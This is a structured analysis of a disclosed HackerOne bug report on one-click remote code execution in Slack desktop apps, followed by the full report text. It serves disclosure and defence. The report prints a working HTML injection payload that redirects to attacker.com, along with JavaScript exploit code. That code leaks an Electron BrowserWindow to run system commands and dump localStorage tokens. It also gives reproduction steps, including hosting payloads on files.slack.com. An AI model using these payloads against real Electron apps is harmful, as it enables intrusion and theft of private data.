# Remote Code Execution in Slack Desktop Apps via HTML Injection and Electron Exploitation

## Metadata
- **Source:** HackerOne
- **Report:** 783877 | https://hackerone.com/reports/783877
- **Submitted:** 2020-01-27
- **Reporter:** oskarsv
- **Program:** Slack
- **Bounty:** Not specified in provided content
- **Severity:** Critical
- **Vuln:** Remote Code Execution (RCE), HTML Injection, Open Redirect, Electron Object Leakage, Security Control Bypass, Cross-Site Scripting (XSS)
- **CVEs:** None
- **Category:** memory-binary

## Summary
A critical RCE vulnerability exists in Slack desktop applications (4.2, 4.3.2+) that combines HTML injection via Slack Posts with Electron object leakage to execute arbitrary commands. An attacker can craft a malicious Slack Post using image maps and area tags to redirect users to an attacker-controlled website, which then exploits Electron APIs to achieve code execution on the victim's machine.

## Attack scenario
1. Attacker uploads RCE payload to attacker-controlled HTTPS server
2. Attacker creates a Slack Post and injects HTML payload using image map/area tags that bypasses CSP and tag restrictions
3. Attacker shares the Post in a channel or sends to user with enticing content (large image/title)
4. Victim clicks on the malicious Post in Slack desktop app, triggering redirect via area tag with target='_self'
5. User is redirected to attacker's website which serves JavaScript that overwrites window.desktop.delegate functions
6. JavaScript exploits Electron object leakage and executes arbitrary system commands with user privileges

## Root cause
Slack desktop apps (built on Electron) expose window.desktop object with delegate functions that can be overwritten. HTML injection via Slack Posts combined with open redirect (area tags with target='_self' bypass the target='_blank' restriction) allows attackers to load attacker-controlled content in the Electron context. Insufficient isolation between Electron APIs and injected content enables RCE.

## Attacker mindset
Sophisticated attacker with deep understanding of Electron internals and Slack's security model. Used creative bypass techniques (image map/area tags) to circumvent CSP and tag filtering. Demonstrated knowledge of delegate function exploitation and BrowserWindow object access. Bonus XSS discovery on files.slack.com shows thorough reconnaissance.

## Defensive takeaways
- Implement stronger Content Security Policy (CSP) that restricts all redirect mechanisms including area/map tags
- Never expose Electron APIs (window.desktop, BrowserWindow) to web content contexts
- Enforce strict iframe sandbox policies and disable target attribute overwriting techniques entirely
- Implement origin-based access controls for redirect destinations (whitelist only internal URLs)
- Use preload scripts to separate Electron APIs in isolated context without window object access
- Validate and sanitize all user-generated content stored in files.slack.com with server-side parsing
- Implement multiple layers of HTML sanitization (parse, validate, then render)
- Apply principle of least privilege to Electron main process access from renderer process

## Variant hunting
Search for other HTML tags that bypass restrictions: svg/animate, details/summary, marquee tags
Test other Electron app exposed objects beyond window.desktop (window.require, window.module)
Look for similar injection points in other Slack features (custom themes, integrations, workflow building)
Test if meta refresh tags or other redirect mechanisms bypass the target attribute controls
Check if other Slack domains (api.slack.com, app.slack.com) have similar XSS/injection vulnerabilities
Investigate if canvas/svg onclick handlers can bypass CSP restrictions
Test persistence mechanisms via Electron storage/localStorage after initial RCE

## MITRE ATT&CK
- T1190
- T1566.002
- T1204.001
- T1203
- T1059.007
- T1176
- T1566.001

## Notes
Report demonstrates sophisticated multi-stage exploitation chain. Researcher showed good understanding of Slack's incremental security improvements (previous injection vectors patched). The bonus XSS on files.slack.com is a separate critical vulnerability that deserves independent attention. Attack requires user interaction but is highly convincing given enticing post format. Affects all platforms (Mac/Windows/Linux). Timeline suggests responsible disclosure was followed.

## Full report
<details><summary>Expand</summary>

# Summary

With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux). 

To demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore [#738229](https://hackerone.com/reports/738229). 

Finally, as an added bonus, a XSS vulnerability on https://files.slack.com is demonstrated as a possible RCE payload store. I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.

{F697022}

# Technical description and steps of reproduction

Exploitation steps:
1. Upload file on your HTTPS enabled server with the RCE payload
2. Prepare a Slack Post with HTML injection
3. Share Post with channel or user

User steps:
1. click on a large post with an enticing image - code executed on PC

Actual path after user click:
1. HTML redirects user's desktop app to attacker website in `_top` frame
2. Attacker website replies with RCE javascript
3. exploit bypasses Slack desktop app env, leaks an Electron object and via it executes arbitrary commands on user's PC. 

**NOTE**: This could also be done with any XSS/in-app redirect vulnerability.

## HTML injection - directly editing Slack Post structure as JSON

### 1. create a new Slack Post with some title and some content

When you create a new Slack Post, it creates a new file on https://files.slack.com with the following JSON structure:
```
{"full":"<p>content<\/p>","preview":"<p>content<\/p>"}
```
{F696858}

The URL to a private file can be found by visiting the private file link returned by the `/api/files.info` call:
{F696861}

The private file URL is in the format `https://files.slack.com/files-pri/{TEAM_ID}-{FILE_ID}/TITLE` under `url_private` response from `/api/files.info`. The Slack Post JSON structure can be observed by simply visiting the private file link.

### 2. Injecting HTML payload

It's possible to directly edit this JSON structure, which can contain arbitrary HTML. Javascript execution is restricted by CSP and various security protections are in place for HTML tags (i.e. banned `iframe`, `applet`, `meta`, `script`, `form` etc. and `target` attribute is overwritten to `_blank` for `A` tags). 

However, it is still possible to inject `area` and `map` tags, which can be used to achieve a one-click-RCE.

To edit the JSON structure directly and inject in that way, you can use the web UI provided by Slack itself:
```
https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit
```
`YOUR-MEMBER-ID` you can copy from your profile view, it's in the format `UXXXXXXXX`

{F696964}

**Alternatively**, it's possible to upload a Javascript/JSON snippet and change it's filetype to `docs` by editing the `filetype` parameter with a HTTP proxy.

Upload payload.json with the JSON below:
{F696941}

Change filetype by intercepting request when when editing file, e.g. change title and intercept HTTP request to `/api/files.edit`:
{F696942}

Since no HTML embedding is possible and various interesting tags are restricted + Javascript is not available because of existing protections and a defined CSP, a new HTML injection payload was developed:
```
<img src="https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png" width="10000" height="10000" usemap="#slack-img">
<map name="slack-img">
<area shape="rect" coords="10000,10000 0,0" href="https://attacker.com/t.html" target="_self">
</map>
```
Note this payload requires an image to reference with the attribute `usemap`. This can be hosted in Slack infrastructure by uploading an image to Slack beforehand.

JSON to provide for Slack Post edit @ `https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit` payload.json:
```
{
  "full": "asd",
  "preview": "<img src=\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-img\"><map name=\"slack-img\"><area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://attacker.com/t.html\" target=\"_self\"></map>"
}
```

### 3. RCE exploit code - hosted on attacker's website 

the URL link within the `area` tag would contain this HTML / JS exploit for Slack Desktop apps which executes any attacker provided command:
```
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
</script>
</body>
</html>
```

For windows just replace `open /Applications/Calculator.app` with `calc` or anything else.

To test the RCE payload, you can open Developer Tools on any Slack Desktop app and paste only the Javascript code in console. It achieves RCE and illustrates that it's independent of any entry point - i.e. redirect within the desktop app.

### 4. easy access to all private data without command execution 

The payload can be easily modified to **access all private conversations, files, tokens etc.** without executing commands on the user's computer: 
```
<html>
<body>
<script>
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false}) // node not necessary for this demo
  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment 
  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
</script>
</body>
</html>
```

{F697023}

Essentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a "tunnel" via `BrowserWindow` to execute arbitrary Javascript, i.e. a weird XSS case with full access to anything the Slack app has - easy access to private channels, conversations, functions etc.

# files.slack.com - alternate payload store and an XSS in itself

During search for an entry point for the RCE exploit, it was discovered that emails (when sent as plaintext) are stored unfiltered on Slack servers at https://files.slack.com and with direct access returned as text/html, without force-download.

This HTML file upload functionality can be used for storing the RCE payload - no need to use own hosting. 

{F697020}

Since it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack. There are no security headers or any restrictions at all as far as I could tell and I'm sure some other security impact could be demonstrated with enough time. 

{F697019}

## How to upload html to files.slack.com

Any email client can be used, i.e. in macOS's default client you can press CMD+SHIFT+T to make an email plaintext, copy paste the RCE payload from above and embed it in your Slack Post HTML injection. 

{F697018}

As the "Send To Slack" email address, you have to 

</details>

---
*Analysed by Claude on 2026-05-11*
